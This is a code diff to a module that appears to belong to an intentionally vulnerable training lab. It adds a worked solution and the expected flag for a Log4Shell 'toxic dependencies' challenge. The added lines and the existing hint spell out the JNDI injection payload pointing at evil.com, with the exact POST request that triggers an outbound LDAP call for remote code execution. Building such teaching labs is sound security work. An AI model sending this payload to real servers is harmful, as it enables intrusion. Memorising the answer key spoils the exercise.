@@ -47,6 +47,8 @@ module.exports = {
     theory: "Toxic configurations or dependencies happen when software relies on third-party integrations or open-source packages that have known, often critical, unpatched vulnerabilities (e.g., Log4Shell in log4j).",
     exploit: "Inject a payload targeting a known vulnerability inside an open-source dependency the project relies on.",
     hint: "Send the JNDI Log4j injection payload: `${jndi:ldap://evil.com/a}`.",
+    whatToSolve: "Send a POST request to /api/vulns/toxic-dependencies/execute with body: { payload: '${jndi:ldap://evil.com/a}', level: 'low' }. The application uses log4j 2.x which is vulnerable to Log4Shell (CVE-2021-44228) — any user-controlled string that reaches the logger is evaluated, and the JNDI expression `${jndi:ldap://...}` causes the server to make an outbound LDAP call to the attacker's server, enabling RCE.",
+    expectedOutput: "{ success: true, message: 'Exploit successful! Here is your flag: flag{toxic-dependencies_success}' }",
     mitigations: ["Implement Software Composition Analysis (SCA) to verify dependency bill-of-materials.","Upgrade severely outdated packages."],
     router: router
 };
